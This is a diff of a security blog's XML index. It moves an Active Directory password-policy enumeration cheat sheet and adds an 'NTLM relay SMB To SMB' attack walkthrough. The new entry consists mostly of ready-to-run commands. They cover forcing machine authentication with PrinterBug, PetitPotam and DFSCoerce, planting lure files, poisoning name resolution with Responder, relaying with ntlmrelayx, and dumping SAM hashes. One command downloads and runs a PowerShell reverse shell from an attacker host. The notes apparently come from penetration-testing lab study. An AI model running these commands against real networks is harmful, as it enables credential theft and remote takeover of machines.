@@ -936,39 +936,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Enumerating &amp; Retrieving Password Policies</title>
-    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
-    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
-
-<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Enumerating &amp; Retrieving Password Policies</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Extracting Passwords from Windows Registry.</title>
     <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
     <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
@@ -1187,6 +1154,39 @@
         <tag>evil-winrm</tag>
         <tag>impacket-psexec</tag>
         <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Enumerating &amp; Retrieving Password Policies</title>
+    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
+
+<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Enumerating &amp; Retrieving Password Policies</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
       </tags>
   </entry>
   <entry>
@@ -1434,6 +1434,150 @@
         <tag>Exploitation</tag>
         <tag>MySQL-Read-Files</tag>
         <tag>MySQL-Write-Files</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NTLM relay SMB To SMB</title>
+    <url>/2026/06/12/NTLM-relay-SMB-To-SMB/</url>
+    <content><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><blockquote>
+<ul>
+<li><p>The machine we relay from should be vulnerable to one of these coercion methods</p>
+</li>
+<li><p><code>SMB signing</code> on the machine we relay to should be <code>disabled</code> or <code>enabled</code>.</p>
+</li>
+</ul>
+</blockquote>
+<p><img src="/img/ntlm-relay-smb-to-smb.png" alt="NTLM Relay SMB to SMB"></p>
+<blockquote>
+<p>➜ Self-relay (relaying back to the same host that authenticated) has been patched since MS08-068, the machine we relay to must therefore be a different machine from the machine we relay from.</p>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Machines-With-signing-False"><a href="#Enumerate-Machines-With-signing-False" class="headerlink" title="Enumerate Machines With signing:False"></a>Enumerate Machines With <code>signing:False</code></h4><blockquote>
+<p>RunFinger.py</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 RunFinger.py -i ip-range</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>NetExec</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb ip-range --gen-relay-list relayTargets.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Nmap</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -Pn --script=smb2-security-mode.nse -p 445 ip-range --open</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h3 id="Coerce-Method-Coerce-Machine-Account"><a href="#Coerce-Method-Coerce-Machine-Account" class="headerlink" title="Coerce Method  : Coerce Machine Account"></a>Coerce Method  : Coerce Machine Account</h3><blockquote>
+<p>➜ We only need domain user credentials </p>
+</blockquote>
+<h5 id="PrinterBug-MS-RPRN"><a href="#PrinterBug-MS-RPRN" class="headerlink" title="PrinterBug (MS-RPRN)"></a>PrinterBug (MS-RPRN)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target_ip&gt; &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="PetitPotam-MS-EFSR"><a href="#PetitPotam-MS-EFSR" class="headerlink" title="PetitPotam (MS-EFSR)"></a>PetitPotam (MS-EFSR)</h5><blockquote>
+<p>➜ if the system is not patched for CVE-2021-36942 we don’t need credentials</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py &lt;attacker_ip&gt; &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="DFSCoerce-MS-DFSNM"><a href="#DFSCoerce-MS-DFSNM" class="headerlink" title="DFSCoerce (MS-DFSNM)"></a>DFSCoerce (MS-DFSNM)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dfscoerce.py -u &lt;user&gt; -p &lt;password&gt; &lt;attacker_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Coercer-automated-all-three-above"><a href="#Coercer-automated-all-three-above" class="headerlink" title="Coercer (automated, all three above)"></a>Coercer (automated, all three above)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Coercer coerce -t &lt;target_ip&gt; -l &lt;attacker_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -v --always-continue</span><br></pre></td></tr></table></figure>
+
+<h5 id="NetExec-coerce-plus"><a href="#NetExec-coerce-plus" class="headerlink" title="NetExec coerce_plus"></a>NetExec coerce_plus</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M coerce_plus -o LISTENER=&lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Coerce-Method-Coerce-User-Account"><a href="#Coerce-Method-Coerce-User-Account" class="headerlink" title="Coerce Method  : Coerce User Account"></a>Coerce Method  : Coerce User Account</h3><blockquote>
+<p>➜ We need only <code>Write access</code> to a shared folder </p>
+</blockquote>
+<h5 id="ntlm-theft"><a href="#ntlm-theft" class="headerlink" title="ntlm_theft"></a>ntlm_theft</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ntlm_theft.py -g all -s &lt;attacker_ip&gt; -f &lt;payload_name&gt;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //&lt;target_ip&gt;/&lt;share&gt; -U &lt;user&gt;</span><br><span class="line"></span><br><span class="line">smb: \&gt; put &lt;payload_name&gt;.lnk</span><br></pre></td></tr></table></figure>
+
+<h5 id="Slinky-nxc-module"><a href="#Slinky-nxc-module" class="headerlink" title="Slinky ( nxc module)"></a>Slinky ( nxc module)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M slinky -o SERVER=&lt;attacker_ip&gt; NAME=&lt;lure_name&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="MSSQL-UNC-path-coercion"><a href="#MSSQL-UNC-path-coercion" class="headerlink" title="MSSQL UNC path coercion"></a>MSSQL UNC path coercion</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mssqlclient.py <span class="string">&#x27;inlanefreight/plaintext$:PASS@&lt;target_ip&gt;&#x27;</span> -windows-auth</span><br><span class="line"></span><br><span class="line">SQL (plaintext$ guest@master)&gt; xp_dirtree \\&lt;attacker_ip&gt;\test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="LLMNR-NBT-NS-mDNS-poisoning"><a href="#LLMNR-NBT-NS-mDNS-poisoning" class="headerlink" title="LLMNR &#x2F; NBT-NS &#x2F; mDNS poisoning"></a>LLMNR &#x2F; NBT-NS &#x2F; mDNS poisoning</h5><blockquote>
+<p>Unlike the other coerce methods we can’t choose who gets coerced, we wait for any user to  mistype a hostname then responder answer the request</p>
+</blockquote>
+<blockquote>
+<p>➜ Disable Responder’s SMB and HTTP servers (so <code>ntlmrelayx</code> can use them):</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/SMB = On/SMB = Off/&quot;</span> Responder.conf</span><br><span class="line">sed -i <span class="string">&quot;s/HTTP = On/HTTP = Off/&quot;</span> Responder.conf</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Start Responder to poison name-resolution broadcasts:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 Responder.py -I &lt;interface&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Relay-Post-Exploitation"><a href="#Relay-Post-Exploitation" class="headerlink" title="Relay &amp; Post-Exploitation"></a>Relay &amp; Post-Exploitation</h3><blockquote>
+<p>Regardless of which coercion method above was used, the captured SMB authentication is relayed with the same way</p>
+</blockquote>
+<blockquote>
+<p>Single target</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t &lt;target_ip&gt; -smb2support</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t smb://&lt;hostname&gt;.&lt;domain&gt; -smb2support</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Multiple Machines </p>
+</blockquote>
+<blockquote>
+<p>We need to update <code>relayTargets.txt </code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smb://IP</span><br><span class="line">smb://hostname.domain.local</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Then</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -tf relayTargets.txt -smb2support</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Normal-User"><a href="#Normal-User" class="headerlink" title="Normal User"></a>Normal User</h5><blockquote>
+<p>If the relayed account is a normal user (non-admin), we can’t SAM dump or RCE , we can only use <code>-i</code> for an interactive SMB session and access shares that the relayed user can read and write.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t &lt;target_ip&gt; -smb2support -i</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nv 127.0.0.1 11000</span><br><span class="line"></span><br><span class="line"><span class="comment"># shares</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Admin-User"><a href="#Admin-User" class="headerlink" title="Admin User"></a>Admin User</h5><blockquote>
+<p>If the relayed account is a local <code>admin user</code> on the machine that we relayed to, <code>ntlmrelayx</code> will automatically <code>dump SAM</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Authenticating against smb://&lt;target_ip&gt; as &lt;DOMAIN&gt;/&lt;USER&gt; SUCCEED</span><br><span class="line">[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Command execution &#x2F; reverse shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t &lt;target_ip&gt; -smb2support -c</span><br><span class="line"><span class="string">&quot;powershell -c IEX(New-Object NET.WebClient).DownloadString(&#x27;http://&lt;attacker_ip&gt;:Port/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;attacker_ip&gt; -Port Port&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Socks"><a href="#Socks" class="headerlink" title="Socks"></a>Socks</h5><blockquote>
+<p>If we want the relayed session to keep alive we can use <code>-socks</code> flag with <code>ntlmrelayx</code> </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -tf relayTargets.txt -smb2support -socks</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Then we can use any tool with <code>proxychains</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 -q smbexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target_ip&gt; -no-pass</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>NTLM Relay</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
+        <tag>PetitPotam</tag>
+        <tag>DFSCoerce</tag>
+        <tag>Responder</tag>
       </tags>
   </entry>
   <entry>
